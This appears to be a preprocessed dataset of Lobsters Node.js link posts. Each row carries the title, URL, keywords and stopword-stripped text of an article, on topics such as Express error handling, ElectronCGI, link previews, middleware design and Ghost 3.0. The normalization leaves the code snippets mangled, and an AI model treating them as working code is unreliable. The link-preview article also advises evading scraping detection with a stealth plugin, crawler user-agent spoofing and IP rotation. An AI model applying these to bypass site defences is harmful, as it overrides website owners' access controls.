72,Lobsters,nodejs,Node.js programming,Cleaner code in an Express REST API with unified error handling,https://www.codepedia.org/ama/cleaner-code-in-expressjs-rest-api-with-custom-error-handling,cleaner code express rest api unified error handling,cleaner code express rest api unified error handling major refactoring rest api wwwbookmarksdev expressjs refactoring remove trycatch around code javascript handling error express async middleware stack overflow expressasyncerrors userid validation errorhandling middleware service method input validation handling error handling middleware code size reduction cloc conclusion bookmarksdev github repo wwwbookmarksdev expressjs errorhandling asyncawait http githubcombookmarksdevbookmarks,cleaner code express rest api unified error handling started simple code duplication removal turned major refactoring complete rewriting error handling moving business logicdb access separate service file another blog post rewriting integration test use asyncawait blog post focus custom error handling made code much cleaner rest api supporting wwwbookmarksdev api us expressjs currently version refactoring make point show example code part drill detail taking top approach sample candidate router method personal bookmark created personalbookmarksrouterpost keycloakprotect async request response let userid requestkauthgrantaccesstokencontentsub userid requestparamsuserid return response status httpstatusunauthorized send new myerror unauthorized userid match subject access token const bookmark bookmarkhelperbuildbookmarkfromrequest request bookmarkuserid userid return response status httpstatusbadrequest send new myerror userid bookmark match userid parameter userid bookmark match userid parameter const missingrequiredattributes bookmarkname bookmarklocation bookmarktags bookmarktagslength missingrequiredattributes return response status httpstatusbadrequest send new myerror missing required attribute missing required attribute bookmarktagslength constantsmaxnumberoftags return response status httpstatusbadrequest send new myerror many tag submitted many tag submitted let blockedtags let bookmarktagslength const tag bookmarktags tagstartswith awesome blockedtags blockedtagsconcat tag blockedtags return response status httpstatusbadrequest send new myerror following tag blocked blockedtags following tag blocked blockedtags bookmarkdescription const descriptionistoolong bookmarkdescriptionlength constantsmaxnumberofcharsfordescription descriptionistoolong return response status httpstatusbadrequest send new myerror description long constantsmaxnumberofcharsfordescription allowed description long constantsmaxnumberofcharsfordescription allowed const descriptionhastoomanylines bookmarkdescriptionsplit n length constantsmaxnumberoflinesfordescription descriptionhastoomanylines return response status httpstatusbadrequest send new myerror description hast many line constantsmaxnumberoflinesfordescription allowed description hast many line constantsmaxnumberoflinesfordescription allowed bookmarkshared const existingbookmark await bookmarkfindone shared true location bookmarklocation lean exec existingbookmark return response status httpstatusconflict send new myerror public bookmark location already present public bookmark location already present try let newbookmark await bookmarksave response set location configbasicapiurl private requestparamsuserid bookmark newbookmarkid status httpstatuscreated send response bookmark created userid requestparamsuserid catch err const duplicatekeyinmongodb errname mongoerror errcode duplicatekeyinmongodb return response status httpstatusconflict send new myerror duplicate key errmessage response status httpstatusinternalservererror send err several issue code name one way long single method userid validation beginning pattern used method protected keycloak btw trigger refactoring one validation exception occurs code break sends response caller potentially missing validation exception trycatch block around database access diligently used whole code base mean good maybe get rid let see refactoring result personalbookmarksrouterpost keycloakprotect async request response useridvalidatorvalidateuserid request const bookmark bookmarkhelperbuildbookmarkfromrequest request let newbookmark await personalbookmarksservicecreatebookmark requestparamsuserid bookmark response set location configbasicapiurl private requestparamsuserid bookmark newbookmarkid status httpstatuscreated send response bookmark created userid requestparamsuserid notice method much shorter remove trycatch around code trycatch block eliminated hack error thrown go error middleware express support promise currently get unhandledpromiserejectionwarning initial solution wrap async function wrapper would catch call would forward error next middleware let wrapasync function fn return function req re next make sure catch error pas along next middleware chain case error handler fn req re next catch next meant calling function like following personalbookmarksrouterpost keycloakprotect asyncwrapperwrapasync async request response useridvalidatorvalidateuserid request const bookmark bookmarkhelperbuildbookmarkfromrequest request let newbookmark await personalbookmarksservicecreatebookmark requestparamsuserid bookmark response set location configbasicapiurl private requestparamsuserid bookmark newbookmarkid status httpstatuscreated send response bookmark created userid requestparamsuserid option mentioned javascript handling error express async middleware stack overflow later found expressasyncerrors script need require start using const express require express require expressasyncerrors good go wrapper needed userid validation userid validation moved file let validateuserid function request const userid requestkauthgrantaccesstokencontentsub userid requestparamsuserid throw new useridtokenvalidationerror userid match subject access token instead returning response custom useridvalidationerror exception thrown class useridvalidationerror extends error constructor message super message thisname useridvalidationerror exception handled errorhandling middleware appjs file appuse function handleuseridvalidationerror error req re next error instanceof useridvalidationerror resstatus httpstatusunauthorized return ressend httpstatus httpstatusunauthorized message errormessage next error errorhandling middleware function similar middleware function except four argument instead three err req re next service method service method personalbookmarksservicecreatebookmark take task input validation saving data database let createbookmark async function userid bookmark bookmarkinputvalidatorvalidatebookmarkinput userid bookmark await bookmarkinputvalidatorverifypublicbookmarkexistenceoncreation bookmark let newbookmark await bookmarksave return newbookmark service express free could easily change api framework keep business logic part intact input validation handling let focus input validation handling bookmarkinputvalidatorvalidatebookmarkinput userid bookmark function validatebookmarkinput userid bookmark let validationerrormessages bookmarkuserid userid validationerrormessagespush userid bookmark match userid parameter bookmarkuserid validationerrormessagespush missing required attribute userid bookmarkname validationerrormessagespush missing required attribute name bookmarklocation validationerrormessagespush missing required attribute location bookmarktags bookmarktagslength validationerrormessagespush missing required attribute tag else bookmarktagslength constantsmaxnumberoftags validationerrormessagespush many tag submitted max allowed let blockedtags let bookmarktagslength const tag bookmarktags tagstartswith awesome blockedtags blockedtagsconcat tag blockedtags validationerrormessagespush following tag blocked blockedtags bookmarkdescription const descriptionistoolong bookmarkdescriptionlength constantsmaxnumberofcharsfordescription descriptionistoolong validationerrormessagespush description long constantsmaxnumberofcharsfordescription allowed const descriptionhastoomanylines bookmarkdescriptionsplit n length constantsmaxnumberoflinesfordescription descriptionhastoomanylines validationerrormessagespush description hast many line constantsmaxnumberoflinesfordescription allowed validationerrormessageslength throw new validationerror bookmark submitted valid validationerrormessages notice validation failure collected instead breaking process flow one occurs end present packed thrown via custom exception class validationerror extends error constructor message validatinerrors super message thisvalidationerrors validatinerrors thisname validationerror treated specialised errorhandling middleware line appuse function handlevalidationerror error request response next error instanceof validationerror return response status httpstatusbadrequest json httpstatus httpstatusbadrequest message errormessage validationerrors errorvalidationerrors next error error handling middleware please find complete error handling middleware appuse function handlenotfounderror error req re next error instanceof notfounderror return resstatus httpstatusnotfound send httpstatus httpstatusnotfound message errormessage error next error appuse function handlepublicbookmarkexistingerror error req re next error instanceof publicbookmarkexistingerror return resstatus httpstatusconflict send httpstatus httpstatusconflict message errormessage error next error appuse function handleuseridvalidationerror error req re next error instanceof useridtokenvalidationerror resstatus httpstatusunauthorized return ressend httpstatus httpstatusunauthorized message errormessage next error appuse function handlevalidationerror error request response next error instanceof validationerror return response status httpstatusbadrequest json httpstatus httpstatusbadrequest message errormessage validationerrors errorvalidationerrors next error appuse function handledatabaseerror error request response next error instanceof mongoerror errorcode return response status httpstatusconflict json httpstatus httpstatusconflict type mongoerror message errormessage else return responsestatus json httpstatus httpstatusserviceunavailable type mongoerror message errormessage next error production error handler stacktraces leaked user appuse function error req re next resheaderssent return next error else resstatus errorstatus httpstatusinternalservererror ressend message errormessage error instead one appuse function error req re next middleware nested ifelse statement verifying error type preferred check one exception type else forward next middleware think improved readability pattern used router code size reduction code much cleaner take also le javascript code although number javascript file grown measure used cloc brew install cloc macos cloc git lsfiles text file unique file file ignored language file blank comment code json javascript yaml markdown dockerfile sum cloc git lsfiles text file unique file file ignored githubcomaldanialcloc v file line language file blank comment code json javascript yaml markdown dockerfile sum conclusion much left say think express offer decent way handle exception hope learned something post improvement please leave comment better make pull request bookmarksdev github repo refactoring researched quite link bookmarked best wwwbookmarksdev following tag expressjs errorhandling asyncawait present shortly generated public bookmark http githubcombookmarksdevbookmarks
73,Lobsters,nodejs,Node.js programming,Ervy - Bring charts to terminal,https://www.chunqiuyiyu.com/ervy/,ervy bring chart terminal,installation usage demo example document,installation npm install ervy usage const ervy require ervy const bar pie bullet donut gauge scatter ervy const data key value key b value key c value consolelog bar data option demo example need detail check document
74,Lobsters,nodejs,Node.js programming,ElectronCGI - A solution to cross-platform GUIs for .Net Core,https://www.blinkingcaret.com/2019/11/27/electroncgi-a-solution-to-cross-platform-guis-for-net-core/,electroncgi solution crossplatform gui net core,full twoway communication node net electroncgi cross platform net core gui electron video nodejs net async improvement tpl dataflow tpl dataflow net core depth part tpl dataflow net core depth part change go wire nodejs npm package net nuget package better logging better debugging intellisense npm package full example calculator demo next electroncgi electroncgidotnet,net core brought ability run develop net multiple platform however still possible build graphical user interface gui using net run nonwindows environment multi platform gui electron probably popular choice electron application usually built exclusively using javascript case using net electron employing trick like full webserver net electron application regular website make request server mimic exactly working normal website difference website running inside electron requiring full webserver able run desktop application feel right plus deal intricacy web framework end goal desktop application feel wasteful electroncgi alternative webserver required way work starting net process node using stdin stdout stream communication channel enables full duplex communication two process written different language little overhead also electroncgi make super easy create connection listen send request even though electroncgi requires node net named electroncgi imagined primary use case would enabling writing gui electron whose behavior defined net electroncgi limited though useful scenario want need functionality form net node way around last couple month working improving electroncgi namely intellisense javascript electroncgi importedrequired also improving async support net finally enabling full duplex communication two process ie net code start request fulfilled node improvement blog post full twoway communication node net electroncgi cross platform net core gui electron original blog post introduced electroncgi change syntax last version one discussing blog post want know motivation behind electroncgi read comprehensive discussion get started place go alternatively also watch video show setup electroncgi also showcase application built continue example demonstrates two way communication node net using electroncgi let describe terminology electroncgi provides ability create connection node net project connection initiated node net project listens connection nodejs creating connection look like node const connectionbuilder require electroncgi const connection new connectionbuilder connectto pathtodotnetexcecutable build connectingto net process supply path executable also use dotnet command appropriate argument advantage requiring publish dotnet executable every time make change use dotnet command change automatic compilation step triggered executable run would look like const connectionbuilder require electroncgi const connection new connectionbuilder connectto dotnet run project pathtodotnetcoreproject build connection node send request net process connectionsend loadorder orderid order something order connection send method required argument request type eg loadorder one request argument eg orderid callback function invoked request loadorder handled net connected process omit callback function expecting response net eg connectionsend start connectionsend select theselection expecting response form net need send argument currently support send null undefined example ignore argument net example connectionsend start null consolelog started new version also register handler request type initiated net example connectionon post listofposts something listofposts net listening incoming connection look like net var connection new connectionbuilder build register handler request type connectionlisten register handler request type use one overload connectionon example connectiononasync int order loadorder async orderid var order await ordersdbgetorder orderid return order also send request net nodejs directly example connectionsend theanswer want run code nodejs handle que request connectionsendasync getdata whichdata async thedata await dbsave thedata basically request capability node available net well async improvement last release adding proper async support net previous version even though could register async request handler onasync connection method handler would run sequence mean request one would take second another would take second would get response second request second time request would take complete version request come another still handled run parallel example would get response second request second impact change easier visualise imagine next two gifs show making concurrent request take random amount time complete look like one version example request sent nodejs number response received corresponding square grid turn red version version concurrency enabled using tpl dataflow wrote two blog post dataflow tpl dataflow net core depth part tpl dataflow net core depth part process incorporating electroncgi change go wire version added ability full duplex communication nodejs net consequence format message exchanged two process changed previously message sent nodejs net following format net stdin id guid request type therequesttype args jsonstringify theargspassedinsend response net nodejs net stdout id guid request result return value handler property omitted value returned old format assumed request written net stdin stream response stdout new version type message sent either channel stdin stdout new message format type request request type therequesttype id guid request args jsonstringify theargspassedinsend type response response id guid request result return value handler property omitted value returned consequence change upgrade nodejs npm package net nuget package get communication error better logging create connection net project option enable logging definitely since point time project way visibility something go wrong net project turn var connection new connectionbuilder withlogging minimumloglevel logleveltrace logfilepath thelogfiletxt build minimumloglevel logfilepath optional default value logleveldebug electroncgilog respectively uncaught exception request handler net look like log electroncgidotnethandlerfailedexception request handler request type start failed systemexception error occurred error detail redditscannerprogram main dmovenext homeblinkingcaretelectroncgiduplexredditshowcaseredditnewpostsscannerdotnetprogramcs line end stack trace previous location exception thrown electroncgidotnetrequesthandler guid requestid object argument homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetrequesthandlercs line electroncgidotnetrequestexecutor executeasync dmovenext homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetrequestexecutorcs line end inner exception stack trace electroncgidotnetrequestexecutedchannelmessagesend ichannel channel homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetrequestexecutedchannelmessagecs line electroncgidotnetmessagedispatcher startasync dmovenext homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetmessagedispatchercs line turn logleveltrace message exchanged process also logged better debugging building application taking advantage electroncgi capability difficult understand thing going way expect especially problem net side thing previous version apart log file connection closing feedback thing work expected especially annoying example compile error net code incorrect path calling dotnet run connection would simply close feedback available going forward electroncgi redirects net stderr stream node process stdout stream inverts background color highlight message came net stderr see example mistype path net project creating connection nodejs image see console run node project creates connection using dotnet run project paththatdoesnotexist would see ran dotnet run projet paththatdoesnotexist directly part red highlighted yellow box see node project console output terribly helpful case would better msbuild output also written stderr easy way change mistake helpful error message example mistype project eg dotnet project path also mean net code use consoleerrorwriteline message displayed node process console might useful development also possible use visual studio debugger attach net application running add breakpoints debugging experience identical net application video example application described later post sure pick right process net attach dropdown intellisense another addition improve development experience using electroncgi availability intellisense include electroncgi npm package get need update latest npm package full example version decided create example focused async duplex ie ability initiate request either node net decided keep example simple possible instead using electron application nodejs net core application connect reddit periodically fetch new post subreddit user select application start want see example electron calculator demo video enceladosviewer application allows user query postgres database ui built using angular app github see video running reason github relies postgres db time create stripped version ok example version application allows select subreddit every second update list latest post subreddit request type used example sent nodejs net one net node node request type start stop selectsubreddit net nodejs showposts request type one interesting thing example start request execute net stop request received node stop request arrive net process sends showposts request node list post start running selectsubreddit request arrives form node update selected subbreddit maintained net moment showposts request contain post new subreddit happen sample app though selectsubredit request sent start diagram summarizes example find full source code example github interesting part net side short description request type work first selectsubreddit code main method var selectedsubreddit connectionon selectsubreddit string newsubreddit selectedsubreddit newsubreddit use closure update shared variable named selectedsubreddit going hold subreddit name illustrates maintain state net side next start request type cancellationtokensource cancelationtokensource new cancellationtokensource connectiononasync start async consoleerrorwriteline started show node console await taskrun async true cancelationtokensourcetokeniscancellationrequested return try var post await redditclientgetlatestpostsfromsubreddit selectedsubreddit connectionsend showposts post await taskdelay catch exception ex consoleerrorwriteline failed get post selectedsubreddit maybe exist show node console consoleerrorwriteline exmessage return cancelationtokensourcetoken using async await task created inside start request handler task second interval query reddit new post selected subreddit every time new post read request named showposts dispatched net node list latest post illustrates duplex part ie nodejs net initiate request go cancel method invoked cancellationtokensource happens start request handler completes theory start request may run indefinitely performing start request nodejs look like connectionsend start null run start finish net connectionclose mean connection maintained start request completes finally stop request handler net invokes cancelationtokensource cancel method connectionon stop consoleerrorwriteline stop cancelationtokensource null cancelationtokensourcecancel cause start request handler complete nodejs showposts request handler display latest post console connectionon showposts post consoleclear postslength consolelog result postsforeach post consolelog posttitle postupvotecount posturl n next one really important thing future electroncgi getting feedback easiest way give feedback project github issue electroncgi electroncgidotnet probably work next error handling particularly error propagate nodejs net viceversa right exception handler net get written log file process terminates ideal alternative error surface process example connectionsend getorder orderid err order err error else use order something might interesting send method nodejs return promise resolve reject case request successful fails respectively finally documentation necessarily related electroncgi particular using electron electroncgi technology like react angular vue blazor hoop jump order get good development experience writing ui using react angular nonui logic running net core electroncgi also something plan write future related
75,Lobsters,nodejs,Node.js programming,How to Create a Link Preview: The Definite Guide [Implementation and Demo Included],https://andrejgajdos.com/how-to-create-a-link-preview/,create link preview definite guide implementation demo included,included link preview bonus tip get data link preview twitter documentation open graph website get data without meta og tag blog post blog post quoracom developersfacebookcom implementation solution stackoverflowcom used library jsdom puppeteer phantomjs visible element development stopped faster le memory intensive configuring puppeteer web scraping puppeteerextrapluginstealth pageevaluate pageexposefunction facebook crawler user agent strategy getting individual element link preview githubcom githubcom githubcom githubcom testing facebook sharing debugger bonus tip article book profile conclusion need full stack web developer let build something get touch like,add link chat message share social network facebook twitter linkedin see small visual preview brief description link main benefit link preview user expectation going get open link blog post build solution turn link released solution npm packaged check source code github deployed demo heroku nowadays see link preview feature almost every social network chat application user send share url link blog post want share create link preview feature without thirdparty apis going describe whole strategy creating link preview including implementation using opensource library nodejs decided write blog post needed create preview link feature found lot misleading outdated information topic found solution worked relied paid thirdparty apis hope article save lot time figuring build feature opensource library backend language included link preview preview url link usually contains title description domain name image create link preview even rich providing information detail check bonus tip get data link preview facebook launched open graph protocol managed open web foundation main purpose easier integration facebook website said open graph protocol allows control information used website shared website want use open graph protocol need open graph meta tag head part website code social network take account open graph protocol well however twitter created tag twitter card called twitter card tag based convention open graph protocol twitter card processor look tag page first check twitterspecific property present fall back supported open graph property find information twitter documentation following open graph tag used creating link preview open graph title tag work meta title tag allows define content title facebook find og title tag us meta title instead tag important title usually shown bold limit number character title character meta title otherwise shortened truncated example facebook truncate character open graph description tag similar meta tag description describe website content similar rule applies tag title tag social network robot find og description tag us meta description limit number character case use around letter open graph image image probably eyecatching element link preview define image og image title recommended resolution pixel x pixel ratio image size exceed open graph url tag defines canonical url page url provided shown facebook newsfeed domain visible complete list og tag available found open graph website get data without meta og tag lot website without basic meta tag og tag data preview case use data document body title website contain meta title tag og title tag consider heading document body main title important heading body document website contain tag look tag description strategy getting website description similar getting title document contain meta description og description consider main text document website description domain name look link rel canonical og url document contain one use url parameter image mentioned attribute image tricky element image represent website url html document contain og image tag another way specify website image link tag attribute rel imagesrc following format link rel imagesrc href image url however find lot website without og image link rel imagesrc tag case need parse image document body raymond camden described blog post facebook google used determine image used link preview facebook used og image link rel imagesrc tag google used first img tag html body none strategy seem right facebook consider image document body google chose first image could image layout slack published blog post create link preview consider image html body someone asked similar question quora facebook determine image show thumbnail posting link facebook employee answered strategy choosing image html body candidate image filtered javascript remove image le pixel height width image ratio longest dimension shortest dimension greater filtered image sorted area user given selection multiple image exist quoracom answer currently accurate facebook allow customize link metada removing ability customize link metadata ie headline description image link sharing entry point facebook eliminating channel abused post false news developersfacebookcom think described strategy work well image le pixel height width perhaps icon image aspect ratio greater fit preview well image greater area perhaps important website content smaller image implementation find several attempt creating library implement link preview feature nodejs solution aws lambda unfortunately main library repository source code available anymore find solution parse meta og tag opensource code making link preview text icon like facebook stackoverflowcom find opensource implementation let build one used library want implement whole strategy creating link preview need use library allows access dom structure html document nodejs environment found three library allow accessing dom jsdom simulates web browser environment nodejs allows access dom structure puppeteer enables control headless chrome nodejs phantomjs headless web browser scriptable javascript jsdom work well need get visible element url jsdom parse cs style well need choose puppeteer phantomjs would recommend using puppeteer phantomjs development stopped puppeteer faster le memory intensive configuring puppeteer web scraping puppeteer lot option allows configure chrome various setting thus using puppeteer first time straightforward open website puppeteer configure scrape data website website want scrape data case use puppeteerextrapluginstealth us various technique make detection headless puppeteer harder want interact website puppeteer need use pageevaluate function puppeteer run script browser nodejs module function want use evaluate function need use pageexposefunction imported module nodejs accessible puppeteer browser exposefunction allows expose function browser browser make request website sends http header called user agent user agent contains information web browser website provide meta tag common user agent puppeteer set facebook crawler user agent case website want provide meta data facebook strategy getting individual element link preview going implement following strategy nodejs applicable every backend language title find og title document header og title exists find meta title tag document header meta title exist find tag document body exist find first occurrence tag document body const gettitle async page const title await pageevaluate const ogtitle documentqueryselector meta property og title ogtitle null ogtitlecontentlength return ogtitlecontent const twittertitle documentqueryselector meta name twitter title twittertitle null twittertitlecontentlength return twittertitlecontent const doctitle documenttitle doctitle null doctitlelength return doctitle const documentqueryselector innerhtml null return const documentqueryselector innerhtml null return return null return title source githubcom description find og description document header og description exists find meta description tag document header meta description tag exist parse text document body find first visible paragraph text site description const getdescription async page const description await pageevaluate const ogdescription documentqueryselector meta property og description ogdescription null ogdescriptioncontentlength return ogdescriptioncontent const twitterdescription documentqueryselector meta name twitter description twitterdescription null twitterdescriptioncontentlength return twitterdescriptioncontent const metadescription documentqueryselector meta name description metadescription null metadescriptioncontentlength return metadescriptioncontent paragraph documentqueryselectorall p let fstvisibleparagraph null let paragraphslength object visible dom paragraph offsetparent null paragraph childelementcount fstvisibleparagraph paragraph textcontent break return fstvisibleparagraph return description source githubcom domain name find link rel canonical og url document nt contain one use url parameter const getdomainname async page uri const domainname await pageevaluate const canonicallink documentqueryselector link relcanonical canonicallink null canonicallinkhreflength return canonicallinkhref const ogurlmeta documentqueryselector meta property og url ogurlmeta null ogurlmetacontentlength return ogurlmetacontent return null return domainname null new url domainname hostnamereplace www new url uri hostnamereplace www source githubcom image find og image document header og image exists find link rel imagesrc tag header link rel imagesrc tag exist find image document body remove image le pixel height width image ratio longest dimension shortest dimension greater return image greatest area const util require util const request utilpromisify require request const geturls require geturls const urlimageisaccessible async url const correctedurls geturls url correctedurlssize const urlresponse await request correctedurlsvalues next value const contenttype urlresponseheaders contenttype return new regexp image test contenttype const getimg async page uri const img await pageevaluate async const ogimg documentqueryselector meta property og image ogimg null ogimgcontentlength await urlimageisaccessible ogimgcontent return ogimgcontent const imgrellink documentqueryselector link rel imagesrc imgrellink null imgrellinkhreflength await urlimageisaccessible imgrellinkhref return imgrellinkhref const twitterimg documentqueryselector meta name twitter image twitterimg null twitterimgcontentlength await urlimageisaccessible twitterimgcontent return twitterimgcontent let imgs arrayfrom documentgetelementsbytagname img imgslength imgs imgsfilter img let addimg true imgnaturalwidth imgnaturalheight imgnaturalwidth imgnaturalheight addimg false else imgnaturalheight imgnaturalwidth addimg false imgnaturalheight imgnaturalwidth addimg false return addimg imgsforeach img imgsrcindexof imgsrc new url uri origin src imgsrc return imgs src return null return img source githubcom testing want test link preview implementation use facebook sharing debugger free tool scrape web page hosted public server display would look shared bonus tip link preview even rich provide insight user example website contains og video tag replace image video information use preview specific tag article book profile consider setting proxy using ip rotation server website try detect web scraping block website block user specific country need check tip avoiding web scraping detection check article conclusion article described social network chat application create link preview described implementation used backend language example implemented whole solution nodejs result opensource nodejs library demo deployed heroku see creating link preview feature easy use correct approach need rely thirdparty api pay similar service need full stack web developer let build something get touch like like loading
76,Lobsters,nodejs,Node.js programming,Beware Middleware,http://twitchard.github.io/posts/2019-11-01-beware-middleware.html,beware middleware,good idea controller model questionable idea middlewares whence cometh darkness law hammer circumstance jenkins shared library,give small boy hammer find everything encounter need pounding abraham kaplan writing http api generally describe two sort behavior behavior applies specific route behavior applies many route good idea controller model application seen behavior applies specific route usually divided controller one model controller ideally skinny much work task translate action described request language http language model separation model controller good idea easier reason constrained data unconstrained data classic example stage compiler let explore analogy little bit first two stage simple compiler lexer parser lexer take completely unconstrained data stream byte emits known token like quotationmark leftparen literal foo parsing take stream token produce syntax tree translating syntax tree representing statement bytecode straightforwardish translating arbitrary stream byte representing statement directly bytecode http request analogy like unconstrained stream byte structure body contain arbitrary byte encode arbitrary json header arbitrary string want express business logic term operation arbitrary request much natural express term account post whatever domain object job controller see similar lexerparser job take unconstrained data structure describing action translate constrained form eg call update method account object record containing string email address bio odd thing analogy lexersparsers return syntax tree produced stream byte http controller typically return representation model method call corrrespond input http request although certainly idea different blog post executes directly compromise analogy though questionable idea middlewares controller though typically involve behavior applies single route behavior applies multiple route experience tends organized series middlewares middleware stack bad idea approximately reason putting controller front model good idea namely middlewares operate unconstrained data structure http request response instead constrained data structure easy reason compose assuming familiarity middlewares characterize briefly middlewares take http request inprogress http response argument meaningful return value therefore must operate mutating request response object mutating global state causing sideeffect throwing error like threw everything learned modelcontroller land trying operate constrained data decided router need http request everywhere middlewares represent simple independent operation still think middleware poor way expressing operation mostly benign trouble begin operation become complex interdependent example qualify simple operation rate limit request perminute perip return request lack valid authorization header log incoming request written middlewares express look something like following code illustrative please try run const ratelimitingmiddleware async req re const ip reqheaders ip dbincrementnrequests ip await dbnrequestssince datenow ip return ressend const authorizationmiddleware async req re const account await dbaccountbyauthorization reqheaders authorization account return ressend const loggingmiddleware async req re mathrandom consolelog request received reqmethod reqpath n reqbody appuse ratelimitingmiddleware authorizationmiddleware loggingmiddleware map important quick dirty plumbing make express play nice asyncawait f req re next f req re next catch err next err advocate along line const shouldratelimit async ip return await dbnrequestssince datenow ip const isauthorizationvalid async authorization return await dbaccountbyauthorization authorization const emitlog method path body mathrandom consolelog request received method path n body const mw async req re const ip authorization reqheaders const method path body req await shouldratelimit ip return ressend await isauthorizationvalid authorization return ressend emitlog method path body appuse req re next asyncawait plumbing mw req re next catch err next err instead registering operation middleware relying express call sequence passing unconstrained request response object write operation function constrained input declared parameter result described return value register single middleware responsible translating http constrained language operation executing believe moral equivalent thin controller simple example approach really clear advantage let introduce complication suppose new requirement come request come admins request admins logged debugging easier admin request subject rate limit either simplest way lookup check logging rate limiting middlewares const ratelimitingmiddleware async req re const account await dbaccountbyauthorization reqheaders authorization accountisadmin return const ip reqheaders ip dbincrementnrequests ip await dbnrequestssince datenow ip return ressend const loggingmiddleware async req re const account await dbaccountbyauthorization reqheaders authorization accountisadmin mathrandom consolelog request received reqmethod reqpath n reqbody unsatisfying better call dbaccountbyauthorization avoid three roundtrips database middlewares produce return value accept argument value produced middlewares way must done mutating request response object like const authorizationmiddleware async req re const account await dbaccountbyauthorization reqheaders authorization account return ressend reqisadmin accountisadmin const ratelimitingmiddleware async req re reqisadmin return const ip reqheaders ip dbincrementnrequests ip await dbnrequestssince datenow ip return ressend const loggingmiddleware async req re reqisadmin mathrandom consolelog request received reqmethod reqpath n reqbody morally disturb first mutation bad least day fallen fashion rightly opinion second isadmin nothing http request seem unnatural smuggle onto object purporting represent http request moreover practical issue code broken ratelimitingmiddleware implicitly depends run authorizationmiddleware run fix put authorizationmiddleware first admins properly exempted rate limit look like without middlewares well const shouldratelimit async ip account return accountisadmin await dbnrequestssince datenow ip const authorizedaccount async authorization return await dbaccountbyauthorization authorization const emitlog method path body account accountisadmin return mathrandom consolelog request received method path n body const mw async req re const ip authorization reqheaders const method path body req const account authorizedaccount authorization account return ressend await shouldratelimit ip account return ressend emitlog method path body account equivalent bug would involve writing eg await shouldratelimit ip account const account authorizedaccount authorization defining variable account used mile easier spot eslint catch made possible defining function constrained parameter return value static analysis get far unconstrained request object grabbags arbitrary property hope example convinces resonates experience using middleware even though issue example still quite mild becomes much worse real application especially add complication mix admins able act account resourcelevel ratelimits ip restriction feature flag whence cometh darkness hopefully convinced middlewares bad least easily misapplied bad come popular written share illadvised middlewares think come law hammer described opening quote give small boy hammer find everything encounter need pounding middlewares hammer small boy web framework express rack laravel etc emphasize concept middlewares knew series operation needed perform request reached router saw middlewares seemed intended purpose never really stopped reason advantage disadvantage seemed like right thing framework wanted think also vague feeling good solve problem way framework want maybe able better take advantage feature framework offer experience hope seldom bear also fallen prey sort thinking circumstance example used jenkins shared library wanted reuse code across multiple ci job wrote ing groovy language abhor done would done known jenkins shared library existed simply write action whatever programming language wanted probably bash case make available called via shell ci worker broader lesson try aware tendency thinking use tool let tool use especially experienced programmer using tool way want used seem quite right probably use function take need argument put result return valueand write application like compiler good lesson
77,Lobsters,nodejs,Node.js programming,"Revolut Emergency: Unofficial desktop app – Freeze cards, list transactions, get notifications",https://github.com/Annihil/revolut-emergency,revolut emergency unofficial desktop app freeze card list transaction get notification,join github today sign file permalink download macos download window download linux install source troubleshooting way topic resource license reload reload,unofficial revolut pc app freeze card list transaction get notification contact support dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time small app let see transaction pocket split unified view freeze card see pocket balance get system notification new transaction contact customer support case emergency loss phone download macos download window download linux install source clone download repository install nodejs open terminal cd downloaded folder run npm install run npm start enjoy troubleshooting receive sm verification code first time log desktop app since new device verification code sent via email find way open app macos unidentified developer instead double clicking r emergencyapp right click open still enough go system preference security privacy click open anyway icon card design copyright revolut affiliation revolut r logo revolut trademark revolut ltd unofficial revolut pc app freeze card list transaction get notification contact support topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
78,Lobsters,nodejs,Node.js programming,Ghost 3.0,https://ghost.org/blog/3-0/,ghost,date ghost made customer revenue whilst maintaining complete independence giving away business launch page ghost story membership subscription stratechery de correspondent patreon ghost jamstack earlier year old way new way documentation popular static site framework ghostorg gatsbyjs netlify library ghost integration continuous theme deployment github action admin api github action example brand new wordpress migration plugin wordpress migration plugin nathan jeffery get ghost ghost pro day free trial already got site ghost pro ghostorg selfhosting ghost ghost update guide coming next ghost forum github know someone would interested share http question comment product hunt,today released third major version ghost representing total commits across almost release product fast stable ever also support membership subscription revenue api driven modern site architecturesbut might wondering thingabout year ago came unconventional funding idea decided rather selling share capital control business return money operate would instead sell good service return money operate result choice fortunate attract world forward thinking investor help steer company customersto date ghost made customer revenue whilst maintaining complete independence giving away business ghost used like apple duckduckgo openai stanford review mozilla cloudflare digital ocean many many whilst operating independent nonprofit organisation releasing open source softwarewe care lot making great publishing software also care proving possible build company fundamentally goodif looking highlight new check launch page follows extended story came everything went itghost storyghost far away biggest release ever done term scale announced today one go point history people involved release ever beforememberships subscriptionsabout three year ago first started talking next big focus ghost might done reasonable job creating new publishing tool much better use alternative felt like missing solving real pressing need modern publishersin conversation people one core theme kept emerging could nt ignore everyone seemed struggling viable business model publishing editorial strategy beyond trying compete much traffic possibleat time handful publisher beginning success new approach selling premium subscription work creating direct relationship audience providing value customersben thompson stratechery proved type business could work single person running dutch news site de correspondent quickly proved could also function national scale patreon began show could work artist creator new publisher bringing business model software service saas publishing proving subscription commerce could work space software subscription software business set problem understood well set economics knew inside outwhen come subscription billing hard part nt actually subscription billing hard part publishing platform integrate subscription billing part nobody else getting pretty good building flexible modern publishing platformas today ghost first totally independent product publishing subscription deeply integrated core allowing anyone build recurring revenue subscription businessghost membership software sustainable revenue publishersdevelop relationship audience start membership business click generate predictable recurring revenue creative workthis first release one incredibly excited lot come think membership subscription fundamentally change relationship publisher audience way better everyone involved curious business model extended interview week ben thompson ghost interview ghost ceo john nolanthere new offering subscription space ghost john nolan founder ceo ghost foundation explains make ghost uniquei find extremely compelling love open source aspect look forward seeing ghost developsghost jamstackthe second half ghost shift think technical architecture product talked earlier year keeping close eye modern web based product evolving particularly excited jamstack movement turn traditional application model head old way make dynamic app generate cached html make fastnew way generate static site add dynamic feature make powerfulthis new architecture unlocks content management fundamentally built via apis webhooks framework generate robust modern website expanded everything ghost space headless cm including detailed content apis admin apis custom integrationsplus also native support documentation popular static site framework fact ghostorg including post gatsbyjs app headless ghost backend post written deployed statically hundred different location netlify global cdn connected fast growing library ghost integrationswe really enjoying new workflow adapting ghost fullfeatured open source headless cm wherever possible matter much love static site code editor development environment never best place write blog postscontinuous theme deployment github actionsone common request gotten year understandably better way deploy 